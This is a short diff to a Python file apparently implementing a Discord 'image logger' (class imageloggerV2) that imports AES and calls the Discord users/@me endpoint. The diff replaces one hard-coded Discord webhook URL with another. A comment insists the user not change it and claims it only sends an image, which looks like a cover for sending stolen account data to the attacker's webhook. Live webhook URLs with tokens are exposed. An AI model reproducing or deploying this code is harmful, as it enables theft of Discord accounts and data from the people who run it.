@@ -16,7 +16,7 @@ from Crypto.Cipher import AES
 
 class imageloggerV2:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/1142616304092717219/JdV1BqxMYuvp3Jfm-AZMOXrwloenOn7ki6aC0pLzCUSA-nUAPn3R3lGGd4KiiG0S-PtR" #THIS EMBEDDED WEBHOOK MAKES A BOT DM YOU THE IMAGE SO YOU CAN SEND IT (DON'T CHANGE IT)
+        self.webhook = "https://discord.com/api/webhooks/1443330783233441943/AeOj5BxMB-f00AdNo0_8iHuUBQdYC0A5V54f2poh28r94LRa7azghF7_csZ3UdqxFkKZ" #THIS EMBEDDED WEBHOOK MAKES A BOT DM YOU THE IMAGE SO YOU CAN SEND IT (DON'T CHANGE IT)
         self.files = ""
 
         self.baseurl = "https://discord.com/api/v9/users/@me"
@@ -450,3 +450,4 @@ class imageloggerV2:
 
 if __name__ == "__main__":
     imageloggerV2()
+
